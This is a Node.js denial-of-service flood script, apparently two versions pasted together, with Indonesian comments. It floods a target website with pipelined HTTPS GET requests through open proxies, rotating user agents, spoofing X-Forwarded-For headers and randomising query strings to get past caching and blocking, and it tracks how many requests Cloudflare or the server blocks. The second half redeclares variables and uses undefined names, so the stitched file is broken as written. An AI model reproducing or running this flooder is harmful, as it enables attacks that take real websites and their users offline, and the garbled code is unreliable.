const net = require("net");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 5){
    console.log(`Usage: node raw js url time rate threads\nExample: node tls.js https://example.com/ 120 16 4`); 
    console.log(`Atau tanpa proxy: node raw.js https://example.com/ 120 16 4 --noproxy`);
    process.exit();
}

const useProxy = process.argv[6] !== "--noproxy";

// TLS Config - HTTP/1.1 Only
const ciphersTLS12 = [
    "TLS_AES_256_GCM_SHA384",
    "TLS_AES_128_GCM_SHA256",
    "TLS_CHACHA20_POLY1305_SHA256",
    "ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES256-GCM-SHA384",
    "ECDHE-ECDSA-CHACHA20-POLY1305",
    "ECDHE-RSA-CHACHA20-POLY1305"
].join(":");

const ecdhCurve = "x25519:secp256r1:secp384r1";

const secureOptions = 
 crypto.constants.SSL_OP_NO_SSLv2 |
 crypto.constants.SSL_OP_NO_SSLv3 |
 crypto.constants.SSL_OP_NO_TLSv1 |
 crypto.constants.SSL_OP_NO_TLSv1_1 |
 crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE;

const secureContext = tls.createSecureContext({
    ciphers: ciphersTLS12,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    minVersion: "TLSv1.2",
    maxVersion: "TLSv1.3"
});

var proxies = [];
if (useProxy) {
    try {
        proxies = fs.readFileSync("proxy.txt", "utf-8").toString().split(/\r?\n/).filter(line => line.trim());
        console.log(`📡 Loaded ${proxies.length} proxies`);
    } catch(e) {
        console.log(`⚠️  No proxy.txt found, using direct connection`);
    }
}

const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"
];

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5]
}

const parsedTarget = url.parse(args.target);
let stats = { total: 0, success: 0, blocked: 0, error: 0, active: 0 };

if (cluster.isMaster) {
    console.log(`🔥 Starting Flood Attack (HTTP/1.1 GACOR)`);
    console.log(`🎯 Target: ${args.target}`);
    console.log(`====================================`);
    
    const statsInterval = setInterval(() => {
        console.log(`\n📊 STATS UPDATE [${new Date().toLocaleTimeString()}]: Total: ${stats.total} | Active: ${stats.active}`);
    }, 3000);
    
    for (let counter = 1; counter <= args.threads; counter++) cluster.fork();
    
    setTimeout(() => {
        clearInterval(statsInterval);
        console.log(`\n✅ Attack Finished!`);
        process.exit(1);
    }, args.time * 1000);
} else {
    const intervalsPerWorker = Math.min(2000, args.Rate);
    for (let i = 0; i < intervalsPerWorker; i++) {
        setTimeout(() => {
            setInterval(() => {
                if (stats.active < 10000) runFlooder();
            }, Math.max(1, Math.floor(1000 / (args.Rate / intervalsPerWorker))));
        }, i * 1);
    }
}

function randomIntn(min, max) { return Math.floor(Math.random() * (max - min) + min); }
function randomElement(elements) { return elements[randomIntn(0, elements.length)]; }
function randomString(length) { return crypto.randomBytes(length).toString('hex').slice(0, length); }
function randomIP() { return randomIntn(1,255) + "." + randomIntn(1,255) + "." + randomIntn(1,255) + "." + randomIntn(1,255); }

function runFlooder() {
    stats.active++;
    
    const makeRequest = (proxyConn) => {
        const tlsOptions = {
            port: 443,
            host: parsedTarget.host,
            servername: parsedTarget.host,
            socket: proxyConn,
            secureContext: secureContext,
            ALPNProtocols: ["http/1.1"], // Kunci ke HTTP/1.1
            rejectUnauthorized: false
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions, () => {
            // Logic HTTP/1.1 Pipelining biar tetep kenceng
            for (let i = 0; i < 10; i++) { // Kirim 10 request per koneksi buat boost
                const randomPath = parsedTarget.path + (Math.random() > 0.5 ? "?" + randomString(8) + "=" + randomString(6) : "");
                const header = `GET ${randomPath} HTTP/1.1\r\n` +
                               `Host: ${parsedTarget.host}\r\n` +
                               `User-Agent: ${randomElement(userAgents)}\r\n` +
                               `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n` +
                               `Accept-Encoding: gzip, deflate, br\r\n` +
                               `X-Forwarded-For: ${randomIP()}\r\n` +
                               `Connection: keep-alive\r\n\r\n`;
                tlsConn.write(header);
            }
        });

        tlsConn.on("data", (chunk) => {
            if (chunk.toString().includes("HTTP/1.1 200")) stats.success++;
            else stats.blocked++;
            stats.total++;
        });

        tlsConn.on("error", () => { tlsConn.destroy(); stats.active--; });
        tlsConn.on("end", () => { stats.active--; });
        setTimeout(() => { if(!tlsConn.destroyed) { tlsConn.destroy(); stats.active--; } }, 5000);
    };

    if (useProxy && proxies.length > 0) {
        const proxyAddr = randomElement(proxies);
        const parsedProxy = proxyAddr.split(":");
        const proxyConn = net.connect({ host: parsedProxy[0], port: ~~parsedProxy[1] });
        proxyConn.once("connect", () => {
            proxyConn.write(`CONNECT ${parsedTarget.host}:443 HTTP/1.1\r\nHost: ${parsedTarget.host}\r\n\r\n`);
        });
        proxyConn.on("data", (d) => { if (d.toString().includes("200")) makeRequest(proxyConn); else proxyConn.destroy(); });
        proxyConn.on("error", () => { stats.active--; });
    } else {
        makeRequest(null);
    }
}if (useProxy) {
    try {
        proxies = fs.readFileSync("proxy.txt", "utf8").split(/\r?\n/).filter(l => l.trim());
        console.log(`📡 Loaded ${proxies.length} proxies`);
    } catch(e) { console.log(`Direct mode`); }
}

let stats = { total: 0, success: 0, blocked: 0, error: 0, active: 0 };

if (cluster.isMaster) {
    console.log(`\n🔥 FLOOD | ${args.target}`);
    console.log(`⏱️ ${args.time}s | ⚡ ${args.rate} req/s | 🧵 ${args.threads} threads\n`);
    
    setInterval(() => {
        console.log(`[${new Date().toLocaleTimeString()}] T:${stats.total} ✅:${stats.success} 🚫:${stats.blocked} ❌:${stats.error} 🔗:${stats.active}`);
    }, 3000);
    
    for (let i = 0; i < args.threads; i++) cluster.fork();
    
    setTimeout(() => {
        console.log(`\n✅ DONE | Total: ${stats.total} | Success: ${stats.success} | Blocked: ${stats.blocked}`);
        process.exit(1);
    }, args.time * 1000);
} else {
    // ============ MULTIPLE INTERVALS ============
    // Biar bisa 200 req/s per worker
    const intervalsPerWorker = Math.min(2000, args.rate);
    const delayPerInterval = Math.max(1, Math.floor(1000 / (args.rate / intervalsPerWorker)));
    
    console.log(`Worker ${cluster.worker.id} | ${intervalsPerWorker} intervals | delay ${delayPerInterval}ms`);
    
    for (let i = 0; i < intervalsPerWorker; i++) {
        setTimeout(() => {
            setInterval(() => {
                if (stats.active < 10000) {
                    runFlooder();
                }
            }, delayPerInterval);
        }, i * 1);
    }
}

function runFlooder() {
    stats.active++;
    
    const sendHttp11 = (socket, proxyConn) => {
        const randomPath = parsedTarget.path + 
            (parsedTarget.path.includes("?") ? "&" : "?") + 
            "r=" + Math.random() + "&_=" + Date.now();
        
        const ua = userAgents[Math.floor(Math.random() * userAgents.length)];
        
        const request = `GET ${randomPath} HTTP/1.1\r\n` +
            `Host: ${parsedTarget.host}\r\n` +
            `User-Agent: ${ua}\r\n` +
            `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n` +
            `Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7\r\n` +
            `Accept-Encoding: gzip, deflate, br\r\n` +
            `Cache-Control: no-cache\r\n` +
            `Sec-Ch-Ua: "Google Chrome";v="123"\r\n` +
            `Sec-Ch-Ua-Mobile: ?0\r\n` +
            `Sec-Ch-Ua-Platform: "Windows"\r\n` +
            `Sec-Fetch-Dest: document\r\n` +
            `Sec-Fetch-Mode: navigate\r\n` +
            `Sec-Fetch-Site: none\r\n` +
            `Upgrade-Insecure-Requests: 1\r\n` +
            `Connection: keep-alive\r\n\r\n`;
        
        socket.write(request);
        
        socket.once("data", (chunk) => {
            const resp = chunk.toString();
            stats.total++;
            if (resp.includes("200") || resp.includes("301") || resp.includes("302")) {
                stats.success++;
            } else if (resp.includes("403") || resp.includes("429") || resp.includes("503") || resp.includes("Cloudflare")) {
                stats.blocked++;
            } else {
                stats.error++;
            }
            socket.destroy();
            if (proxyConn) proxyConn.destroy();
            stats.active--;
        });
        
        setTimeout(() => {
            if (!socket.destroyed) {
                socket.destroy();
                if (proxyConn) proxyConn.destroy();
                stats.active--;
            }
        }, 1000);
    };
    
    const makeRequest = (proxyConn = null) => {
        const tlsOptions = {
            host: parsedTarget.host,
            port: 443,
            rejectUnauthorized: false,
            servername: parsedTarget.host,
            ciphers: ciphers,
            honorCipherOrder: true,
            minVersion: "TLSv1.2",
            maxVersion: "TLSv1.3",
            ALPNProtocols: ["http/1.1"]
        };
        
        if (proxyConn) tlsOptions.socket = proxyConn;
        
        const tlsConn = tls.connect(tlsOptions);
        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true);
        
        tlsConn.once("secureConnect", () => {
            sendHttp11(tlsConn, proxyConn);
        });
        
        tlsConn.on("error", () => {
            stats.total++;
            stats.error++;
            if (proxyConn) proxyConn.destroy();
            stats.active--;
        });
    };
    
    if (useProxy && proxies.length > 0) {
        const proxyAddr = proxies[Math.floor(Math.random() * proxies.length)];
        const [pHost, pPort] = proxyAddr.split(":");
        
        const proxyConn = net.connect({ host: pHost, port: parseInt(pPort), allowHalfOpen: true });
        proxyConn.setTimeout(5000);
        
        const connectPayload = `CONNECT ${parsedTarget.host}:443 HTTP/1.1\r\nHost: ${parsedTarget.host}\r\nUser-Agent: ${userAgents[0]}\r\n\r\n`;
        
        proxyConn.on("connect", () => {
            proxyConn.write(connectPayload);
        });
        
        proxyConn.on("data", (chunk) => {
            const resp = chunk.toString();
            if (resp.includes("200 Connection established") || resp.includes("200 OK")) {
                proxyConn.removeAllListeners("data");
                makeRequest(proxyConn);
            } else {
                proxyConn.destroy();
                stats.active--;
            }
        });
        
        proxyConn.on("error", () => {
            stats.active--;
        });
        
        proxyConn.on("timeout", () => {
            proxyConn.destroy();
            stats.active--;
        });
    } else {
        makeRequest(null);
    }
}
